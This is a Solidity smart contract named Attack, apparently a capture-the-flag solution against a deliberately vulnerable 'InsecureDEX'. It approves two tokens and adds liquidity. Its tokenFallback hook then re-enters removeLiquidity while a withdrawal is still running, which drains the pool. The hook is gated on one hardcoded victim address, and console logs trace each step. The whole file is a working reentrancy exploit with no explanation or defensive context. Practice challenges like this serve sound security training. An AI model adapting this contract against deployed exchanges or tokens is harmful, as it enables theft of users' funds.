// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.14;

import "hardhat/console.sol";

interface ISec {
    function approve(address, uint256) external;
}

interface ISet {
    function approve(address, uint256) external;
    function balanceOf(address) external returns(uint256);
}

interface IInsecureDEX{
        function removeLiquidity(uint256 amount) external returns (uint amount0, uint amount1);
        function addLiquidity(uint256 amount0, uint256 amount1) external;    
}

contract Attack {

    function exploit(address isecAddress,address isetAddress,address contractAddress) external{
        //Add pool liquidity and exploit removing with a reentrancy
        ISec isecContract=ISec(isecAddress);
        ISet isetContract=ISet(isetAddress);
        IInsecureDEX dexContract = IInsecureDEX(contractAddress);
        console.log("victim  :",contractAddress);
        console.log("attacker:",address(this));
        console.log("isec    :",isecAddress);
        console.log("iset    :",isetAddress);
        console.log("010");
        isecContract.approve(address(dexContract),type(uint256).max);
        console.log("020");
        isetContract.approve(address(dexContract),type(uint256).max);
        console.log("030");
        dexContract.addLiquidity(1 ether,1 ether);
        console.log("040");
        dexContract.removeLiquidity(1 ether);
        console.log("050");
    }

    function tokenFallback(address victimAddress,uint256 amount,bytes memory uselessData) external{
        console.log("Fallback from victim:",victimAddress);
        console.log("Fallback from sender:",msg.sender);
        console.log("Fallback this       :",address(this));
        if (victimAddress==0x948B3c65b89DF0B4894ABE91E6D02FE579834F8F) {
            console.log("Fallback Active");
            ISet isetContract=ISet(msg.sender);
            if (isetContract.balanceOf(victimAddress)>0){
                IInsecureDEX dexContract = IInsecureDEX(victimAddress);
                dexContract.removeLiquidity(1 ether);
            }
        }
    }

}